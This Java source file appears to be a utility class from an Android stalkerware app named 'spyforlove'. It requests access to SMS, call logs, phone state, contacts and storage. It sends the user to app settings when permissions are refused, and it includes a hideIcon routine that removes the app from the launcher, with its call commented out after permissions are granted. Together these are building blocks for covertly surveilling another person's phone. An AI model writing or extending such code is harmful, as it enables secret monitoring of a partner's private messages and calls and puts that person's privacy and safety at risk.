package chem.kth.spyforlove.utils;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.provider.Settings;

import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;

import java.text.Format;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import chem.kth.MainApplication;
import chem.kth.spyforlove.MainActivity;

public class AppUtils {
    @SuppressLint("SimpleDateFormat")
    private static final Format format = new SimpleDateFormat("yyyy MM dd HH:mm:ss");

    public static Date convertTime(long time) {
        return new Date(time);
    }

    private static void hideIcon() {
        PackageManager p = MainApplication.getContext().getPackageManager();
        ComponentName componentName = new ComponentName(MainApplication.getContext(), MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private static void showIcon() {
        PackageManager p = MainApplication.getContext().getPackageManager();
        ComponentName componentName = new ComponentName(MainApplication.getContext(), MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void permissionRequestSend() {
        Dexter.withContext(MainApplication.getContext())
                .withPermissions(
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE
                ).withListener(new MultiplePermissionsListener() {
            @Override
            public void onPermissionsChecked(MultiplePermissionsReport report) {
                if (report.isAnyPermissionPermanentlyDenied()) {
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    Uri uri = Uri.fromParts("package", MainApplication.getContext().getPackageName(), null);
                    intent.setData(uri);
                    MainApplication.getContext().startActivity(intent);
                } else if (report.areAllPermissionsGranted()) {
//                    AppUtils.hideIcon();
                }
            }

            @Override
            public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {
                token.continuePermissionRequest();
            }
        }).check();
    }

}
